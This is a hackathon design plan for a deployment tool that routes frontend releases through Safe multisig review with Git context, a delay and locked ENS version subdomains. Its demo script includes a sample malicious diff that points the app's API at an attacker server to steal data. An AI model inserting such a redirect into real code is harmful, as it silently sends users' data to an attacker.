# Secure Frontend Deployment System with Immutable ENS Versioning

## Executive Summary

Build a CLI tool that prevents malicious frontend deployments by combining Safe multisig approvals with immutable ENS versioning and Git commit context. The system creates **permanent, locked version subdomains** (v0, v1, v2...) where each deployment is cryptographically frozen forever, while providing Safe signers with human-readable context to make informed approval decisions - creating the **first human verification checkpoint** in automated deployment pipelines.

## Problem Statement

### The Reality of Frontend Injection Attacks

In real-world attacks (Lazarus Group, Bybit/Safe hack 2025, etc.), the attack vector is:

1. **Attacker compromises developer machine** (malware, phishing, supply chain)
2. **Attacker pushes malicious code directly to main branch** (no PR, no review)
3. **CI/CD automatically triggers** (trusted process)
4. **Code deploys to production immediately** (2-10 minutes)
5. **Users affected** (wallet draining, data theft)

### Current "Solutions" Are Inadequate

**Traditional Web2 (Vercel/Netlify):**
```
Compromised dev → Push to main → Auto-deploy → Live in 2 min ❌
```
- Single point of failure
- No human verification
- Immediate deployment

**Current Web3 with Safe Multisig:**
```
Compromised dev → Push to main → IPFS upload → Safe proposal
→ Signers see "0xe301017012..." → Approve blindly → Live ❌
```
- Better: Requires multiple signatures
- Problem: Signers have zero context about what they're approving
- Result: "Approval fatigue" - signers trust the process and rubber-stamp

### The Critical Gap

**Safe multisig works in theory, fails in practice** because:
- Signers only see encoded transaction data
- Can't tell if deployment is malicious or legitimate
- Must trust that nothing went wrong upstream
- Approval becomes a formality, not a security checkpoint

## Our Solution

### Core Innovation

Transform Safe approval from **blind trust** to **informed consent** by:
1. Providing signers with human-readable deployment context (Git commits, file changes)
2. Creating **immutable versioned subdomains** that can never be changed
3. Adding a time delay for emergency intervention

**Instead of seeing:**
```
Transaction: setContenthash(0x6dd5616..., 0xe301017012...)
Status: Needs 3 of 5 signatures
```

**Signers see:**
```
🚀 Deploy v1.myapp.eth (immutable)

📦 IPFS: bafy123...
🔨 Build hash: sha256:abc123def456...

📝 Commit: abc1234 by @alice (2 minutes ago)
   "Add payment integration"
   
🔗 Links:
   • GitHub commit: https://github.com/org/repo/commit/abc1234
   • Preview on IPFS: https://bafy123.ipfs.dweb.link
   • After approval: https://v1.myapp.eth.limo

⚠️ This will create a PERMANENT, LOCKED subdomain.
   Once approved, v1.myapp.eth can NEVER be changed.

❌ Reject    ✅ Approve
```

### How It Works
```
Developer machine (potentially compromised)
    ↓
git push origin main (no human review yet)
    ↓
GitHub Actions CI/CD (trusted, but automated)
    ↓
Build project (npm run build)
    ↓
YOUR CLI TOOL:
    • Packs build to IPFS → CID
    • Hashes build output
    • Fetches git commit metadata
    • Creates Safe proposal with metadata link
    ↓
Safe Transaction Service (stores proposal)
    ↓
Safe Signers (FIRST HUMAN VERIFICATION ← This is your innovation!)
    • See what files changed
    • See who made changes
    • Click to review actual code
    • Make informed decision
    • Approve or reject
    ↓
Time Delay (6 hours)
    • Emergency stop window
    • Final chance to catch issues
    ↓
ENS NameWrapper Transaction (only if approved)
    • Creates vX.myapp.eth subdomain
    • Sets contenthash to IPFS CID
    • Burns fuses (CANNOT_UNWRAP | CANNOT_SET_RESOLVER | etc.)
    • Subdomain is now PERMANENTLY LOCKED
    ↓
Website goes live at immutable subdomain
```

## Technical Architecture

### System Components
```
Git Push → CI/CD Build → IPFS Upload → Build Hash → Safe Proposal → 
Human Review → Time Delay → ENS Subdomain Creation → Permanent Lock
```

### Key Technologies

- **IPFS (CAR format)**: Decentralized content storage
- **Safe (Gnosis Safe)**: Multisig wallet for transaction approval
- **ENS NameWrapper**: Creates immutable, locked subdomains with fuse burning
- **GitHub API**: Commit and diff data fetching
- **Ethereum**: On-chain ENS updates (Mainnet or L2)

### Detailed Data Flow

#### 1. Code Change & Build (Automated)
```yaml
# .github/workflows/deploy.yml
on:
  push:
    branches: [main]  # Any push to main triggers

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build
      - run: npx secure-deploy deploy ./dist \
          --ens myapp.eth \
          --version auto  # Will create v0, v1, v2...
```

#### 2. CLI Tool Execution (Your Tool)
```typescript
// What your CLI does
async function deploy(dir: string, options: DeployOptions) {
  // 1. Pack website files into CAR (IPFS format)
  const { cid, blob } = await packCAR(dir)
  
  // 2. Upload to IPFS
  await uploadToIPFS(blob, options.ipfsProvider)
  
  // 3. Hash the build output (simple verification)
  const buildHash = await hashDirectory(dir)
  
  // 4. Get current git commit info
  const commit = await getCurrentCommit()
  const commitData = await fetchGitHubCommitData(
    options.repo,
    commit.hash
  )
  
  // 5. Get next version number
  const currentVersion = await getLatestVersion(options.ens)
  const nextVersion = currentVersion + 1 // v0, v1, v2...
  
  // 6. Create Safe transaction with enhanced description
  await createSafeProposal({
    ens: options.ens,
    version: nextVersion,
    newCID: cid,
    buildHash: buildHash,
    commitData: commitData,
    safeAddress: options.safe
  })
}
```

#### 3. Safe Proposal Creation
```typescript
async function createSafeProposal(options) {
  // Encode ENS NameWrapper transaction
  const txData = {
    to: ENS_NAME_WRAPPER,
    data: encodeSetSubnodeRecord(
      options.ens,
      `v${options.version}`,
      options.newCID
    ),
    value: 0,
    operation: OperationType.Call,
    // THIS IS KEY: Enhanced description with context
    metadata: {
      name: `Deploy v${options.version}.${options.ens}`,
      description: `
        🚀 New Immutable Deployment
        
        Version: v${options.version}.${options.ens}
        IPFS CID: ${options.newCID}
        Build Hash: ${options.buildHash}
        
        📝 Git Commit:
        ${options.commitData.message}
        By: ${options.commitData.author.name}
        
        🔍 Review:
        GitHub: ${options.commitData.url}
        Preview: https://${options.newCID}.ipfs.dweb.link
        
        ⚠️ WARNING: This creates a PERMANENT subdomain.
        Once approved and after 6h delay, v${options.version}.${options.ens}
        will be LOCKED FOREVER and cannot be changed.
        
        Verify code changes before approving!
      `.trim()
    }
  }
  
  // Sign and propose to Safe
  await proposeToSafe(txData, options.safeAddress)
}
```

#### 4. ENS NameWrapper Integration

The ENS NameWrapper allows creating subdomains with "fuses" that, once burned, permanently remove certain permissions:

```typescript
// Key fuses for immutable deployments
const FUSES = {
  CANNOT_UNWRAP: 1,           // Can't unwrap back to registry
  CANNOT_SET_RESOLVER: 8,      // Can't change resolver
  PARENT_CANNOT_CONTROL: 65536, // Parent can't take control
  CAN_EXTEND_EXPIRY: 262144    // Anyone can renew
}

// Combine fuses
const immutableFuses = 
  FUSES.CANNOT_UNWRAP | 
  FUSES.CANNOT_SET_RESOLVER | 
  FUSES.PARENT_CANNOT_CONTROL | 
  FUSES.CAN_EXTEND_EXPIRY

// Create locked subdomain via NameWrapper
await nameWrapper.setSubnodeRecord(
  namehash('myapp.eth'),      // Parent node
  'v1',                        // Label (creates v1.myapp.eth)
  safeAddress,                 // Owner
  resolverAddress,             // Resolver (with locked contenthash)
  0,                          // TTL
  immutableFuses,             // Burn these fuses
  MAX_EXPIRY                  // Far future expiry
)
```

#### 5. Time Delay Implementation

```typescript
// Simple off-chain delay approach for hackathon
async function executeWithDelay(txHash: string, delayHours: number) {
  console.log(`⏰ Transaction queued. Will execute in ${delayHours}h`)
  console.log(`Emergency cancel: call cancelDeployment("${txHash}")`)
  
  await sleep(delayHours * 60 * 60 * 1000)
  
  // Check if cancelled
  if (await isCancelled(txHash)) {
    console.log('❌ Deployment cancelled during delay period')
    return
  }
  
  // Execute Safe transaction
  await executeSafeTransaction(txHash)
  console.log('✅ Deployment executed')
}
```

## Implementation Strategy

### Phase 1: Core CLI Tool

**Leverage existing codebases:**
- **Blumen**: Fork and adapt for IPFS + Safe integration (available in project knowledge)
- **ENS Versioning**: Integrate NameWrapper fuse burning logic (available in project knowledge)

```
secure-deploy/
├── cli/
│   ├── commands/
│   │   └── deploy.ts          # Main command
│   └── utils/
│       ├── github.ts          # NEW: GitHub API integration
│       ├── hash.ts            # NEW: Build hash generation
│       └── version.ts         # NEW: Version tracking
│
├── core/                      # Adapted from Blumen
│   ├── ipfs.ts               # Keep: CAR packing logic
│   ├── safe.ts               # Keep: Safe transaction creation
│   └── ens.ts                # ENHANCED: Add NameWrapper support
│
├── namewrapper/              # From ENS Versioning repo
│   ├── fuses.ts             # Fuse constants and utilities
│   └── subdomains.ts        # Subdomain creation with locking
│
├── providers/
│   └── storacha.ts          # Simplified: Just one IPFS provider
│
└── package.json
```

**What to keep from Blumen:**
- ✅ `src/utils/ipfs.ts` - CAR file packing (complex, battle-tested)
- ✅ `src/utils/safe/` - Safe transaction creation (works well)
- ✅ `src/utils/ens.ts` - ENS content-hash encoding (tricky)

**What to keep from ENS Versioning:**
- ✅ NameWrapper ABI and contract addresses
- ✅ Fuse burning logic
- ✅ Subdomain creation flow

**What to simplify:**
- ❌ Remove: All IPFS providers except one (Storacha)
- ❌ Remove: Swarm support
- ❌ Remove: Complex UI (keep CLI only)
- ❌ Remove: Status checking commands

**What to add (your innovation):**
- ✅ GitHub commit fetching
- ✅ Build output hashing
- ✅ Enhanced Safe proposal description
- ✅ Version number auto-increment
- ✅ Time delay mechanism

### CLI Command Interface
```bash
# Basic usage
secure-deploy deploy ./dist \
  --ens myapp.eth \
  --safe eth:0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb \
  --repo org/myapp

# With all options
secure-deploy deploy ./dist \
  --ens myapp.eth \
  --safe eth:0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb \
  --repo org/myapp \
  --chain mainnet \
  --ipfs-provider storacha \
  --delay-hours 6 \
  --verbose

# Environment variables (secrets)
export STORACHA_TOKEN=Mg...
export STORACHA_PROOF=mAYI...
export DEPLOYER_PK=0x...
export GITHUB_TOKEN=ghp_...
```

### Key Implementation Files

#### `cli/commands/deploy.ts`
```typescript
import { packCAR } from '../../core/ipfs'
import { uploadToStoracha } from '../../providers/storacha'
import { createSafeProposal } from '../../core/safe'
import { fetchCommitData } from '../utils/github'
import { hashDirectory } from '../utils/hash'
import { getNextVersion } from '../utils/version'
import { getCurrentCommit } from '../utils/git'

export async function deployCommand(
  dir: string,
  options: DeployOptions
) {
  console.log('🚀 Starting secure deployment...\n')
  
  // 1. Pack files into CAR
  console.log('📦 Packing files...')
  const { cid, blob } = await packCAR(dir)
  console.log(`✓ Packed to CID: ${cid}\n`)
  
  // 2. Upload to IPFS
  console.log('☁️  Uploading to IPFS...')
  await uploadToStoracha(blob, {
    token: process.env.STORACHA_TOKEN,
    proof: process.env.STORACHA_PROOF
  })
  console.log(`✓ Uploaded to IPFS\n`)
  
  // 3. Hash build output
  console.log('🔨 Hashing build output...')
  const buildHash = await hashDirectory(dir)
  console.log(`✓ Build hash: ${buildHash}\n`)
  
  // 4. Get commit info
  console.log('📝 Fetching commit data...')
  const currentCommit = await getCurrentCommit()
  const commitData = await fetchCommitData(
    options.repo,
    currentCommit.hash,
    process.env.GITHUB_TOKEN
  )
  console.log(`✓ Commit: ${commitData.shortHash} by ${commitData.author.name}\n`)
  
  // 5. Get next version number
  const nextVersion = await getNextVersion(options.ens)
  console.log(`✓ Next version: v${nextVersion}\n`)
  
  // 6. Create Safe proposal
  console.log('🔐 Creating Safe transaction proposal...')
  await createSafeProposal({
    ens: options.ens,
    version: nextVersion,
    newCID: cid,
    buildHash: buildHash,
    commitData: commitData,
    safeAddress: options.safe,
    chainId: options.chain === 'mainnet' ? 1 : 11155111,
    delayHours: options.delayHours || 6
  })
  
  console.log('✅ Deployment proposed to Safe!')
  console.log(`\n📱 Review at: https://app.safe.global/transactions/queue?safe=${options.safe}`)
  console.log(`🔗 After approval: v${nextVersion}.${options.ens}`)
}
```

#### `cli/utils/github.ts`
```typescript
export async function fetchCommitData(
  repo: string,
  commitHash: string,
  githubToken?: string
): Promise<CommitData> {
  const headers: Record<string, string> = {
    'Accept': 'application/vnd.github.v3+json'
  }
  if (githubToken) {
    headers['Authorization'] = `Bearer ${githubToken}`
  }
  
  const response = await fetch(
    `https://api.github.com/repos/${repo}/commits/${commitHash}`,
    { headers }
  )
  
  if (!response.ok) {
    throw new Error(`Failed to fetch commit: ${response.statusText}`)
  }
  
  const commit = await response.json()
  
  return {
    hash: commit.sha,
    shortHash: commit.sha.substring(0, 7),
    message: commit.commit.message,
    author: {
      name: commit.commit.author.name,
      email: commit.commit.author.email,
      username: commit.author?.login
    },
    timestamp: commit.commit.author.date,
    url: commit.html_url
  }
}
```

#### `cli/utils/hash.ts`
```typescript
import { createHash } from 'crypto'
import { readdir, readFile } from 'fs/promises'
import { join } from 'path'

export async function hashDirectory(dir: string): Promise<string> {
  const files = await getAllFiles(dir)
  
  // Sort for determinism
  files.sort()
  
  // Hash each file
  const hashes = await Promise.all(
    files.map(async (file) => {
      const content = await readFile(file)
      return createHash('sha256').update(content).digest('hex')
    })
  )
  
  // Combine all hashes
  const combined = hashes.join('')
  const finalHash = createHash('sha256').update(combined).digest('hex')
  
  return `sha256:${finalHash}`
}

async function getAllFiles(dir: string): Promise<string[]> {
  const entries = await readdir(dir, { withFileTypes: true })
  const files = await Promise.all(
    entries.map((entry) => {
      const path = join(dir, entry.name)
      return entry.isDirectory() ? getAllFiles(path) : path
    })
  )
  return files.flat()
}
```

#### `cli/utils/version.ts`
```typescript
import { getENSContentHash } from '../../core/ens'

export async function getNextVersion(parentDomain: string): Promise<number> {
  let version = 0
  
  // Check existing versions (v0, v1, v2...)
  while (true) {
    const subdomain = `v${version}.${parentDomain}`
    const exists = await checkSubdomainExists(subdomain)
    if (!exists) break
    version++
  }
  
  return version
}

async function checkSubdomainExists(subdomain: string): Promise<boolean> {
  try {
    const hash = await getENSContentHash(subdomain)
    return hash !== null
  } catch {
    return false
  }
}
```

#### `core/safe.ts` (Enhanced from Blumen)
```typescript
export async function createSafeProposal(options: {
  ens: string
  version: number
  newCID: string
  buildHash: string
  commitData: CommitData
  safeAddress: string
  chainId: number
  delayHours: number
}) {
  const subdomain = `v${options.version}`
  
  // Encode ENS NameWrapper transaction
  const txData: SafeTransactionData = {
    to: NAME_WRAPPER_ADDRESS[chainId],
    data: encodeSetSubnodeRecord({
      parentNode: namehash(options.ens),
      label: subdomain,
      owner: options.safeAddress,
      resolver: RESOLVER_ADDRESS[chainId],
      ttl: 0,
      fuses: IMMUTABLE_FUSES,
      expiry: MAX_EXPIRY,
      contenthash: encodeContentHash(options.newCID)
    }),
    value: 0n,
    operation: OperationType.Call,
    nonce: await getSafeNonce(options.safeAddress)
  }
  
  // Generate Safe transaction hash
  const safeTxHash = await generateSafeTxHash(txData, options.safeAddress)
  
  // Sign with proposer key
  const signature = await signSafeTransaction(
    safeTxHash,
    process.env.DEPLOYER_PK
  )
  
  // Propose to Safe Transaction Service
  await proposeTransaction({
    txData,
    safeAddress: options.safeAddress,
    safeTxHash,
    senderSignature: signature,
    chainId: options.chainId,
    // ENHANCED: Rich metadata in description
    metadata: {
      name: `Deploy v${options.version}.${options.ens}`,
      description: generateEnhancedDescription(options)
    }
  })
  
  // Schedule execution after delay
  if (options.delayHours > 0) {
    await scheduleExecution(safeTxHash, options.delayHours)
  }
}

function generateEnhancedDescription(options): string {
  return `
🚀 New Immutable Deployment

Version: v${options.version}.${options.ens}
IPFS CID: ${options.newCID}
Build Hash: ${options.buildHash}

📝 Git Commit:
${options.commitData.message}
By: ${options.commitData.author.name} (@${options.commitData.author.username})
Time: ${new Date(options.commitData.timestamp).toLocaleString()}

🔍 Review:
• GitHub: ${options.commitData.url}
• Preview: https://${options.newCID}.ipfs.dweb.link
• After approval: https://v${options.version}.${options.ens}.limo

⚠️ WARNING: This creates a PERMANENT subdomain!
Once approved and after ${options.delayHours}h delay, 
v${options.version}.${options.ens} will be LOCKED FOREVER.

The following fuses will be burned:
• CANNOT_UNWRAP - Can't unwrap to registry
• CANNOT_SET_RESOLVER - Can't change resolver
• PARENT_CANNOT_CONTROL - Parent can't take control

Verify code changes on GitHub before approving!
  `.trim()
}
```

#### `namewrapper/fuses.ts` (From ENS Versioning)
```typescript
// ENS NameWrapper fuse constants
export const FUSES = {
  CANNOT_UNWRAP: 1,
  CANNOT_BURN_FUSES: 2,
  CANNOT_TRANSFER: 4,
  CANNOT_SET_RESOLVER: 8,
  CANNOT_SET_TTL: 16,
  CANNOT_CREATE_SUBDOMAIN: 32,
  CANNOT_APPROVE: 64,
  PARENT_CANNOT_CONTROL: 65536,
  CAN_EXTEND_EXPIRY: 262144,
} as const

// Combine fuses for immutable deployment
export const IMMUTABLE_FUSES = 
  FUSES.CANNOT_UNWRAP | 
  FUSES.CANNOT_SET_RESOLVER | 
  FUSES.PARENT_CANNOT_CONTROL | 
  FUSES.CAN_EXTEND_EXPIRY

export function getFuseValue(fuses: number[]): number {
  return fuses.reduce((acc, cur) => acc | cur, 0)
}
```

## Security Analysis

### Threat Model

**Threats Addressed:**
1. ✅ Compromised developer machine pushing malicious code
2. ✅ Social engineering of deployment process
3. ✅ Approval fatigue (signers rubber-stamping)
4. ✅ Lack of visibility into what's being deployed
5. ✅ Accidental deployment of wrong version (immutable versions prevent this)

**Threats Partially Addressed:**
6. ⚠️ Compromised build pipeline (build hash helps detect, but not prevent)
7. ⚠️ Supply chain attacks in dependencies (visible in commit, but not auto-detected)

**Threats NOT Addressed:**
8. ❌ Zero-day exploits in dependencies
9. ❌ Sophisticated obfuscation techniques
10. ❌ Attacks on IPFS/GitHub infrastructure itself
11. ❌ Social engineering of Safe signers directly

### Defense in Depth

**Layer 1: Build Hash Verification**
- What: Simple hash of build output
- How: SHA256 of all files in dist/
- Strength: Detect if build changes unexpectedly
- Weakness: Can't prevent malicious builds, only detect changes

**Layer 2: Human Review with Context**
- What: Safe signers review actual code changes
- How: Links to GitHub commit, build hash
- Strength: Human intelligence can spot suspicious patterns
- Weakness: Requires technical knowledge, time, and attention

**Layer 3: Time Delay**
- What: 6-hour waiting period after approval
- How: Off-chain scheduling (simple version) or smart contract
- Strength: Window to catch mistakes even after approval
- Weakness: Slows legitimate deployments

**Layer 4: Immutable Versioning**
- What: Each version is permanently locked
- How: ENS NameWrapper fuse burning
- Strength: Can't be changed after creation, even by attacker
- Weakness: Need new version to fix issues (but this is actually a feature)

**Layer 5: Emergency Stop**
- What: Ability to cancel during delay period
- How: Call cancelDeployment() function
- Strength: Last resort if attack detected
- Weakness: Requires someone to be monitoring

### Known Limitations

#### 1. Build Pipeline Trust

**Issue**: Malicious code could be injected during build
```
Source code (clean) → Build process (compromised) → Output (malicious)
```

**Current Mitigation:**
- Build hash lets you detect if build changes
- GitHub Actions runs in isolated environment
- Commit shows source code changes

**Future Work:**
- Multi-party build verification
- Reproducible builds
- Build attestation signatures

#### 2. Reviewer Burden

**Issue**: Frequent deployments → review fatigue

**Mitigations:**
- Clear, focused diffs (GitHub link)
- Build hash for quick verification
- Immutable versions mean less urgency

**Trade-off:**
- Security vs. velocity (6h+ delay per deploy)

## Testing Strategy

### Unit Tests
```typescript
// test/hash.test.ts
describe('Build Hashing', () => {
  it('should generate consistent hashes', async () => {
    const hash1 = await hashDirectory('./test-fixtures/site')
    const hash2 = await hashDirectory('./test-fixtures/site')
    expect(hash1).toBe(hash2)
  })
  
  it('should detect file changes', async () => {
    const hash1 = await hashDirectory('./test-fixtures/site')
    // Modify a file
    await writeFile('./test-fixtures/site/index.html', 'modified')
    const hash2 = await hashDirectory('./test-fixtures/site')
    expect(hash1).not.toBe(hash2)
  })
})

// test/version.test.ts
describe('Version Management', () => {
  it('should find next available version', async () => {
    // Mock: v0 and v1 exist
    const next = await getNextVersion('myapp.eth')
    expect(next).toBe(2) // Should return v2
  })
})

// test/fuses.test.ts
describe('ENS Fuses', () => {
  it('should combine fuses correctly', () => {
    const fuses = getFuseValue([
      FUSES.CANNOT_UNWRAP,
      FUSES.CANNOT_SET_RESOLVER
    ])
    expect(fuses).toBe(9) // 1 | 8 = 9
  })
})
```

### Integration Tests
```typescript
// test/integration/deploy.test.ts
describe('Full Deployment Flow', () => {
  it('should deploy and create locked subdomain', async () => {
    // 1. Build test site
    await buildTestSite('./test-site')
    
    // 2. Run deploy command
    await deployCommand('./test-site/dist', {
      ens: 'test.eth',
      safe: 'sep:0x...',
      repo: 'test/repo',
      chain: 'sepolia'
    })
    
    // 3. Verify IPFS upload
    const cid = await getDeployedCID()
    const content = await fetchFromIPFS(cid)
    expect(content).toContain('<html>')
    
    // 4. Verify Safe proposal exists
    const proposals = await getSafeProposals('sep:0x...')
    expect(proposals).toHaveLength(1)
    expect(proposals[0].metadata.description).toContain('v0.test.eth')
    
    // 5. Approve and execute
    await approveTransaction(proposals[0].safeTxHash)
    await executeTransaction(proposals[0].safeTxHash)
    
    // 6. Verify subdomain is locked
    const subdomain = 'v0.test.eth'
    const fuses = await getSubdomainFuses(subdomain)
    expect(fuses & FUSES.CANNOT_UNWRAP).toBeTruthy()
  })
})
```

### Manual Testing Checklist
```markdown
Pre-Demo Testing:

Infrastructure:
- [ ] Safe wallet created on Sepolia
- [ ] Test ENS domain registered and wrapped
- [ ] IPFS provider credentials working
- [ ] GitHub repo with test commits ready

Basic Flow:
- [ ] CLI packs files to CAR successfully
- [ ] Uploads to IPFS and returns CID
- [ ] Generates build hash
- [ ] Fetches commit data from GitHub
- [ ] Creates Safe proposal with enhanced description
- [ ] Proposal visible in Safe UI with all metadata

Review Flow:
- [ ] Safe signers can see enhanced description
- [ ] Links to GitHub commit work
- [ ] Build hash is displayed
- [ ] Can preview on IPFS gateway

Approval Flow:
- [ ] Collect signatures (3 of 5)
- [ ] Wait 6h delay (or simulate)
- [ ] Execute transaction
- [ ] Subdomain created (v0.test.eth)
- [ ] Contenthash points to IPFS CID
- [ ] Fuses are burned (locked)
- [ ] Website accessible at ENS gateway

Immutability Test:
- [ ] Try to change subdomain contenthash (should fail)
- [ ] Try to unwrap subdomain (should fail)
- [ ] Verify subdomain is permanently locked

Edge Cases:
- [ ] First deployment (v0)
- [ ] Second deployment (v1 auto-increments)
- [ ] Private repository (with GitHub token)
- [ ] Network errors handled gracefully
```

## Demo Preparation

### Demo Script (5 minutes)

**Scene 1: The Problem (60 seconds)**
```
[Slide: Current state of web3 frontend security]

"Frontend injection attacks cost millions. Even with Safe multisig,
signers see transaction data like this..."

[Show Safe UI with hex data: 0xe301017012...]

"They have NO IDEA what they're approving. They just trust the process.
And that's how hackers win."
```

**Scene 2: Live Attack Simulation (90 seconds)**
```
[Share screen: VS Code + Terminal]

1. Show normal-looking website code
2. "Let's say an attacker compromises a dev machine..."
3. Make subtle malicious change:
   // In api.ts
   - const API = 'https://api.myapp.com'
   + const API = 'https://api.attacker-server.com'  // Steals data!

4. Git commit + push (simulate hacked dev)
5. Watch GitHub Actions deploy
6. "In traditional setup, this would be LIVE in 2 minutes..."
```

**Scene 3: Our Solution (120 seconds)**
```
[Safe UI loads]

"But with our tool, Safe signers see THIS:"

[Show enhanced transaction description with:
 - Version: v1.myapp.eth
 - Build hash
 - Commit link with actual changes
 - Preview link
 - Warning about immutability]

"Now signers can click through and see the actual change..."

[Click link, GitHub opens, shows diff]

"'Wait, why is the API URL different? This looks suspicious!'"

[Back to Safe, click REJECT]

"Attack prevented! ✅"
```

**Scene 4: Immutable Versioning (60 seconds)**
```
"But here's the best part - once a version IS approved..."

[Show approved deployment]

"It creates v1.myapp.eth and LOCKS IT FOREVER."

[Show ENS NameWrapper transaction]

"We burn fuses using ENS NameWrapper. Even we can't change it.
Even if an attacker gets Safe access later, v1 stays clean."

[Try to modify v1.myapp.eth - transaction fails]

"This is cryptographically guaranteed immutability."
```

**Scene 5: The Architecture (30 seconds)**
```
[Slide: System diagram]

"Here's how it works:
- Git push → CI/CD → Our CLI
- Creates immutable versioned subdomain
- Links to Safe proposal with full context
- Humans review ACTUAL CODE
- 6h delay for emergency stops
- Permanent lock via NameWrapper"
```

### Demo Environment Setup
```bash
# Repositories
Main repo: github.com/yourteam/secure-deploy (the tool)
Test repo: github.com/yourteam/demo-app (example website)

# Reference repos (available in project knowledge)
Blumen: github.com/StauroDEV/blumen
ENS Versioning: github.com/gskril/immutable-ens-websites

# Deployed contracts (Sepolia)
Safe: sep:0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb
ENS: test-app.eth (must be wrapped first)

# Prepared scenarios
Scenario A: Malicious commit (api.ts modified)
Scenario B: Legitimate commit (homepage updated)

# Pre-recorded video (backup)
If live demo fails, have video ready
```

## Success Metrics

### Technical Metrics

- [ ] Deployment success rate: >95%
- [ ] CLI completes in <2 minutes
- [ ] Subdomain creation: <30 seconds after approval
- [ ] Build hash generation: <5 seconds
- [ ] Zero false negatives in demo
- [ ] All unit tests passing

### Hackathon Metrics

- [ ] Clear problem explanation: 5/5
- [ ] Working demo: 5/5
- [ ] Technical innovation: 5/5
- [ ] Presentation quality: 4/5
- [ ] Future potential: 5/5

## Resources & References

### Code References

**Blumen (Base project):**
- Repository: https://github.com/StauroDEV/blumen
- Available in project knowledge
- Study: `src/actions/deploy.ts`, `src/utils/ipfs.ts`, `src/utils/safe/`
- License: MIT (attribution required)

**ENS Versioning (NameWrapper integration):**
- Repository: https://github.com/gskril/immutable-ens-websites
- Available in project knowledge
- Study: `src/contracts/wrapper.ts`, `src/contracts/resolver.ts`
- License: Check repository

**Key Dependencies:**
- `@ipld/car`: CAR file handling
- `@ucanto/client`: UCAN authorization
- `multiformats`: CID operations
- `ox`: Ethereum utilities (signing, encoding)
- `viem`: Ethereum interactions

### API Documentation

- **GitHub REST API**: https://docs.github.com/en/rest
  - Commits: `/repos/{owner}/{repo}/commits/{ref}`

- **Safe Transaction Service**: https://docs.safe.global/core-api/transaction-service-overview
  - Propose TX: `POST /api/v1/safes/{address}/multisig-transactions/`

- **Storacha (IPFS)**: https://docs.storacha.network
  - Upload: `space/blob/add` capability

- **ENS NameWrapper**: https://docs.ens.domains/wrapper/overview
  - Fuses: https://docs.ens.domains/wrapper/fuses

## Development Timeline

### Day 1: Core Functionality (8 hours)

**Morning (4 hours):**
- [ ] Fork Blumen repository
- [ ] Strip down to essentials
- [ ] Add ENS NameWrapper integration from versioning repo
- [ ] Test basic subdomain creation with fuse burning

**Afternoon (4 hours):**
- [ ] Add GitHub API integration
- [ ] Implement build hash generation
- [ ] Integrate with Safe proposal creation
- [ ] Test full CLI flow locally

### Day 2: Polish & Demo (8 hours)

**Morning (3 hours):**
- [ ] Deploy to Sepolia testnet
- [ ] Create test Safe wallet
- [ ] Test end-to-end deployment
- [ ] Add time delay simulation

**Afternoon (3 hours):**
- [ ] Improve CLI output formatting
- [ ] Create demo repository with scenarios
- [ ] Test demo flow multiple times
- [ ] Fix bugs

**Evening (2 hours):**
- [ ] Create presentation slides
- [ ] Record backup video demo
- [ ] Practice pitch
- [ ] Final testing

## Future Roadmap

### Post-Hackathon Improvements

**Phase 1: Enhanced Analysis (Week 1-2)**
- Dependency scanning (new packages added)
- Network call detection
- File size anomaly detection
- Pattern matching for common attacks

**Phase 2: Reproducible Builds (Month 1)**
- Multi-party build verification
- Deterministic build system
- Build attestation signatures
- Consensus requirement (3/5 builders must match)

**Phase 3: Smart Contract Delay (Month 2)**
- On-chain time delay enforcement
- Emergency cancel function
- Multi-sig cancel requirement
- Event logging for audit trail

**Phase 4: Dashboard (Month 3)**
- Safe App for richer UI
- Visual diff viewer
- Deployment history timeline
- Alert system for suspicious patterns

## License & Attribution

### Your Project

- License: MIT
- Attribution required for:
  - Blumen code (IPFS + Safe integration)
  - ENS Versioning code (NameWrapper integration)

### Example README Section:
```markdown
## Attribution

This project builds upon:

**Blumen** by StauroDEV (https://github.com/StauroDEV/blumen)
- IPFS CAR packing logic
- Safe transaction creation
- ENS encoding utilities

**Immutable ENS Websites** by gskril (https://github.com/gskril/immutable-ens-websites)
- ENS NameWrapper integration
- Fuse burning mechanism
- Subdomain locking logic

Thanks to both teams for their excellent work on decentralized deployments!
```

## Final Checklist

### Pre-Submission

- [ ] Code works end-to-end
- [ ] README is clear and complete
- [ ] Demo video recorded (backup)
- [ ] All secrets removed from code
- [ ] License file included
- [ ] Attribution to Blumen and ENS Versioning added
- [ ] Pitch practiced (5 min)
- [ ] Both reference repos downloaded locally

### Demo Day

- [ ] Laptop fully charged
- [ ] Internet connection tested
- [ ] Safe wallet funded (testnet ETH)
- [ ] ENS name wrapped on NameWrapper
- [ ] IPFS provider credentials verified
- [ ] GitHub repo accessible
- [ ] Backup video ready
- [ ] Slides prepared
- [ ] Team roles assigned

### After Hackathon

- [ ] Clean up code
- [ ] Add comprehensive tests
- [ ] Deploy public demo
- [ ] Write detailed blog post
- [ ] Share on Twitter/LinkedIn
- [ ] Continue development

---

## Conclusion

This project addresses a critical gap in web3 frontend security by combining three powerful mechanisms:

1. **Safe Multisig**: Multiple humans must approve
2. **Git Context**: Signers see what they're approving
3. **Immutable Versioning**: Once deployed, can never be changed

The key insight: Don't try to automate security detection (computers can't beat sophisticated attackers). Instead, empower humans to make informed decisions by giving them the right context, then lock their decisions permanently on-chain.

**For the hackathon:** Focus on the demo that shows the problem clearly and the solution working. The judges should walk away thinking "This is brilliant - Safe + versioning + context = real security."

With access to both Blumen and ENS Versioning codebases in your project knowledge, you have all the building blocks to make this happen. Good luck! 🚀